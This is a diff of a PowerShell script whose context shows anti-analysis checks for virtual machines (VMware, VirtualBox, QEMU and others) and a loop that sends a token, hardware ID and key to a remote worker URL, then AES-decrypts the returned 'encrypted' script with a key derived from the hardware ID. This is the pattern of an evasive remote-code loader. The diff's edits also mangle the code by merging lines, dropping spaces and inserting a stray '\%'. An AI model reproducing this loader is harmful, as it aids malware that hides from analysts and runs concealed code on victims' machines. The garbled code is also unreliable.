@@ -17,7 +17,7 @@ function Test-VirtualEnvironment {
     try {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
         $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue$vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
-        foreach ($kw in $vmKeywords) {
+        foreach ($kw in$vmKeywords) {
             if ($bios.Manufacturer -match$kw -or $comp.Model -match$kw -or $bios.SMBIOSBIOSVersion -match$kw) {
                 return $true
             }
@@ -128,13 +128,12 @@ while ($true) {
 
             $sessionToken =$tokenResponse.token
             $scriptBody = @{ action = "get_script"; token = $sessionToken; hwid = $userHwid; key =$inputKey } | ConvertTo-Json
-            $scriptResponse = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $scriptBody -Headers$customHeaders
+            $scriptResponse = Invoke-RestMethod -Uri$workerUrl -Method Post -Body $scriptBody -Headers$customHeaders
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
                     function Decrypt-Payload-CBC($encDataHex,$ivHex, $hwid) {$aes = [System.Security.Cryptography.Aes]::Create()
-                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                         
                         $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
                         
@@ -147,8 +146,7 @@ while ($true) {
                         }
                         $aes.IV =$ivBytes
                         
-                        if (($encDataHex.Length % 2) -ne 0) {
-                        $encDataHex += "0"
+                        if (($encDataHex.Length \% 2) -ne 0) {$encDataHex += "0"
                         }
 
                         $cipherBytes = New-Object byte[] ($encDataHex.Length / 2)
